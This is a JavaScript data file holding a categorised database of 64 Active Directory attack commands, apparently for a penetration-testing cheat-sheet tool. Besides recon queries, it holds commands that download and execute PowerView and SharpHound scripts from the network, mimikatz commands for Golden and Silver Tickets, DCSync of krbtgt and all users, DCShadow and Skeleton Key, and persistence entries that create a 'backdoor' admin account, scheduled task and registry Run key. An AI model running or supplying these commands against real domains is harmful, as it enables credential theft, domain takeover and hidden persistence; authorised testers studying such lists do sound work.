// Active Directory & Domain Controller Commands Database

const ACTIVE_DIRECTORY_COMMANDS = {
    "Domain Reconnaissance": [
        { id: 1, name: "PowerView Domain Info", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-Domain\"", description: "Get domain information using PowerView", category: "Domain Reconnaissance" },
        { id: 2, name: "Domain Controllers", command: "nltest /dclist:{domain}", description: "List all domain controllers", category: "Domain Reconnaissance" },
        { id: 3, name: "Domain Trusts", command: "nltest /domain_trusts", description: "Enumerate domain trust relationships", category: "Domain Reconnaissance" },
        { id: 4, name: "Forest Info", command: "powershell -c \"[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\"", description: "Get forest information", category: "Domain Reconnaissance" },
        { id: 5, name: "Domain SID", command: "powershell -c \"(Get-ADDomain).DomainSID\"", description: "Get domain SID", category: "Domain Reconnaissance" },
        { id: 6, name: "Domain Functional Level", command: "powershell -c \"(Get-ADDomain).DomainMode\"", description: "Check domain functional level", category: "Domain Reconnaissance" },
        { id: 7, name: "FSMO Roles", command: "netdom query fsmo", description: "Identify FSMO role holders", category: "Domain Reconnaissance" },
        { id: 8, name: "Global Catalog Servers", command: "nltest /dsgetsite", description: "Find Global Catalog servers", category: "Domain Reconnaissance" }
    ],
    
    "User Enumeration": [
        { id: 9, name: "Domain Users", command: "net user /domain", description: "List all domain users", category: "User Enumeration" },
        { id: 10, name: "PowerView All Users", command: "powershell -ep bypass -c \"Get-DomainUser | Select-Object name,samaccountname,description\"", description: "Get all domain users with PowerView", category: "User Enumeration" },
        { id: 11, name: "Admin Users", command: "net group \"Domain Admins\" /domain", description: "List Domain Admin users", category: "User Enumeration" },
        { id: 12, name: "Enterprise Admins", command: "net group \"Enterprise Admins\" /domain", description: "List Enterprise Admin users", category: "User Enumeration" },
        { id: 13, name: "Schema Admins", command: "net group \"Schema Admins\" /domain", description: "List Schema Admin users", category: "User Enumeration" },
        { id: 14, name: "Service Accounts", command: "powershell -c \"Get-ADUser -Filter {ServicePrincipalName -ne \\$null} -Properties ServicePrincipalName\"", description: "Find service accounts", category: "User Enumeration" },
        { id: 15, name: "Privileged Users", command: "powershell -ep bypass -c \"Get-DomainUser -AdminCount | Select-Object name,samaccountname\"", description: "Find privileged users (AdminCount=1)", category: "User Enumeration" },
        { id: 16, name: "Disabled Users", command: "powershell -c \"Get-ADUser -Filter {Enabled -eq \\$false}\"", description: "Find disabled user accounts", category: "User Enumeration" },
        { id: 17, name: "Never Expires Passwords", command: "powershell -c \"Get-ADUser -Filter {PasswordNeverExpires -eq \\$true}\"", description: "Users with non-expiring passwords", category: "User Enumeration" },
        { id: 18, name: "Password Not Required", command: "powershell -c \"Get-ADUser -Filter {PasswordNotRequired -eq \\$true}\"", description: "Users that don't require passwords", category: "User Enumeration" }
    ],
    
    "Group Enumeration": [
        { id: 19, name: "Domain Groups", command: "net group /domain", description: "List all domain groups", category: "Group Enumeration" },
        { id: 20, name: "PowerView Groups", command: "powershell -ep bypass -c \"Get-DomainGroup | Select-Object name,samaccountname,description\"", description: "Get domain groups with PowerView", category: "Group Enumeration" },
        { id: 21, name: "Local Administrators", command: "net localgroup administrators", description: "List local administrators", category: "Group Enumeration" },
        { id: 22, name: "Remote Desktop Users", command: "net localgroup \"Remote Desktop Users\"", description: "List Remote Desktop users", category: "Group Enumeration" },
        { id: 23, name: "Group Members", command: "net group \"{group}\" /domain", description: "List members of specific group", category: "Group Enumeration" },
        { id: 24, name: "Empty Groups", command: "powershell -c \"Get-ADGroup -Filter * | Where-Object {-not (Get-ADGroupMember -Identity \\$_)}\"", description: "Find empty groups", category: "Group Enumeration" },
        { id: 25, name: "Nested Groups", command: "powershell -ep bypass -c \"Get-DomainGroup -MemberIdentity '{username}'\"", description: "Find nested group memberships", category: "Group Enumeration" }
    ],
    
    "Computer Enumeration": [
        { id: 26, name: "Domain Computers", command: "net view /domain", description: "List domain computers", category: "Computer Enumeration" },
        { id: 27, name: "PowerView Computers", command: "powershell -ep bypass -c \"Get-DomainComputer | Select-Object name,operatingsystem,lastlogon\"", description: "Get computer info with PowerView", category: "Computer Enumeration" },
        { id: 28, name: "Server Operating Systems", command: "powershell -c \"Get-ADComputer -Filter {OperatingSystem -like '*Server*'}\"", description: "Find servers in domain", category: "Computer Enumeration" },
        { id: 29, name: "Workstation OS", command: "powershell -c \"Get-ADComputer -Filter {OperatingSystem -like '*Windows 10*' -or OperatingSystem -like '*Windows 11*'}\"", description: "Find workstations", category: "Computer Enumeration" },
        { id: 30, name: "Inactive Computers", command: "powershell -c \"\\$date = (Get-Date).AddDays(-90); Get-ADComputer -Filter {LastLogonDate -lt \\$date}\"", description: "Find inactive computers (90+ days)", category: "Computer Enumeration" },
        { id: 31, name: "Unconstrained Delegation", command: "powershell -ep bypass -c \"Get-DomainComputer -Unconstrained\"", description: "Find unconstrained delegation computers", category: "Computer Enumeration" },
        { id: 32, name: "Constrained Delegation", command: "powershell -c \"Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne \\$null}\"", description: "Find constrained delegation", category: "Computer Enumeration" }
    ],
    
    "Kerberos Attacks": [
        { id: 33, name: "ASREPRoast", command: "powershell -ep bypass -c \"Get-DomainUser -PreauthNotRequired | Select-Object samaccountname\"", description: "Find ASREPRoast targets", category: "Kerberos Attacks" },
        { id: 34, name: "Kerberoasting", command: "powershell -ep bypass -c \"Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname\"", description: "Find Kerberoasting targets", category: "Kerberos Attacks" },
        { id: 35, name: "Request SPN Tickets", command: "powershell -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/{domain}'\"", description: "Request Kerberos tickets", category: "Kerberos Attacks" },
        { id: 36, name: "Export Tickets", command: "mimikatz \"kerberos::list /export\"", description: "Export Kerberos tickets", category: "Kerberos Attacks" },
        { id: 37, name: "Golden Ticket", command: "mimikatz \"kerberos::golden /user:{username} /domain:{domain} /sid:{sid} /krbtgt:{hash} /ptt\"", description: "Create Golden Ticket", category: "Kerberos Attacks" },
        { id: 38, name: "Silver Ticket", command: "mimikatz \"kerberos::golden /user:{username} /domain:{domain} /sid:{sid} /target:{target} /service:{service} /rc4:{hash} /ptt\"", description: "Create Silver Ticket", category: "Kerberos Attacks" }
    ],
    
    "LDAP Enumeration": [
        { id: 39, name: "Basic LDAP Query", command: "dsquery * -filter \"(objectClass=user)\" -limit 0", description: "Basic LDAP user query", category: "LDAP Enumeration" },
        { id: 40, name: "LDAP Search", command: "ldapsearch -x -h {ip} -s base namingcontexts", description: "LDAP naming contexts", category: "LDAP Enumeration" },
        { id: 41, name: "Anonymous LDAP", command: "ldapsearch -x -h {ip} -s sub -b \"dc={domain},dc=com\"", description: "Anonymous LDAP enumeration", category: "LDAP Enumeration" },
        { id: 42, name: "LDAP Password Policy", command: "powershell -c \"Get-ADDefaultDomainPasswordPolicy\"", description: "Get password policy via LDAP", category: "LDAP Enumeration" },
        { id: 43, name: "LDAP GPO Links", command: "dsquery * -filter \"(objectClass=organizationalUnit)\" -attr gpLink", description: "Find GPO links", category: "LDAP Enumeration" }
    ],
    
    "GPO Attacks": [
        { id: 44, name: "GPO Enumeration", command: "powershell -c \"Get-GPO -All\"", description: "List all GPOs", category: "GPO Attacks" },
        { id: 45, name: "GPP Passwords", command: "powershell -ep bypass -c \"Get-DomainGPO | Get-DomainGPOLocalGroup | Where-Object {\\$_.GroupName -eq 'Administrators'}\"", description: "Find GPP passwords", category: "GPO Attacks" },
        { id: 46, name: "GPO Permissions", command: "powershell -c \"Get-GPPermission -All -TargetType User\"", description: "Check GPO permissions", category: "GPO Attacks" },
        { id: 47, name: "Vulnerable GPOs", command: "powershell -ep bypass -c \"Get-DomainGPO | Get-DomainObjectAcl | Where-Object {\\$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner'}\"", description: "Find writable GPOs", category: "GPO Attacks" }
    ],
    
    "DCSync & DCShadow": [
        { id: 48, name: "DCSync Attack", command: "mimikatz \"lsadump::dcsync /domain:{domain} /user:krbtgt\"", description: "DCSync attack on krbtgt", category: "DCSync & DCShadow" },
        { id: 49, name: "DCSync All Users", command: "mimikatz \"lsadump::dcsync /domain:{domain} /all\"", description: "DCSync all users", category: "DCSync & DCShadow" },
        { id: 50, name: "DCSync Specific User", command: "mimikatz \"lsadump::dcsync /domain:{domain} /user:{username}\"", description: "DCSync specific user", category: "DCSync & DCShadow" },
        { id: 51, name: "DCShadow Setup", command: "mimikatz \"!+\" \"!processtoken\" \"lsadump::dcshadow /object:{username} /attribute:pwdlastset /value:0\"", description: "DCShadow attribute modification", category: "DCSync & DCShadow" }
    ],
    
    "Forest & Trust Attacks": [
        { id: 52, name: "Inter-Forest Trusts", command: "nltest /trusted_domains", description: "List trusted domains", category: "Forest & Trust Attacks" },
        { id: 53, name: "Trust Relationships", command: "powershell -ep bypass -c \"Get-DomainTrust\"", description: "Get trust relationships", category: "Forest & Trust Attacks" },
        { id: 54, name: "Foreign Security Principals", command: "powershell -c \"Get-ADObject -Filter {objectClass -eq 'foreignSecurityPrincipal'}\"", description: "Find foreign security principals", category: "Forest & Trust Attacks" },
        { id: 55, name: "Cross-Forest Enumeration", command: "powershell -ep bypass -c \"Get-DomainUser -Domain {foreign_domain}\"", description: "Enumerate foreign domain users", category: "Forest & Trust Attacks" }
    ],
    
    "Persistence Techniques": [
        { id: 56, name: "Create Service", command: "sc create backdoor binPath=\"cmd /c net user backdoor password123 /add && net localgroup administrators backdoor /add\"", description: "Service persistence", category: "Persistence Techniques" },
        { id: 57, name: "Scheduled Task", command: "schtasks /create /tn \"backdoor\" /tr \"cmd /c whoami > C:\\temp\\out.txt\" /sc minute /mo 1", description: "Scheduled task persistence", category: "Persistence Techniques" },
        { id: 58, name: "WMI Event", command: "powershell -c \"Register-WmiEvent -Query 'SELECT * FROM Win32_LogonSession' -Action {whoami}\"", description: "WMI event persistence", category: "Persistence Techniques" },
        { id: 59, name: "Registry Run Key", command: "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"cmd.exe\"", description: "Registry persistence", category: "Persistence Techniques" },
        { id: 60, name: "Skeleton Key", command: "mimikatz \"misc::skeleton\"", description: "Skeleton key attack", category: "Persistence Techniques" }
    ],
    
    "BloodHound": [
        { id: 61, name: "SharpHound Collection", command: "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All\"", description: "Collect BloodHound data", category: "BloodHound" },
        { id: 62, name: "SharpHound Stealth", command: "powershell -ep bypass -c \"Invoke-BloodHound -CollectionMethod Group,LocalAdmin,Session,Trusts -NoSaveCache\"", description: "Stealth BloodHound collection", category: "BloodHound" },
        { id: 63, name: "BloodHound Python", command: "bloodhound-python -d {domain} -u {username} -p {password} -gc {domain_controller} -c all", description: "BloodHound Python collector", category: "BloodHound" },
        { id: 64, name: "Custom Queries", command: "MATCH (u:User) WHERE u.admincount=true RETURN u.name", description: "Custom BloodHound Cypher query", category: "BloodHound" }
    ]
};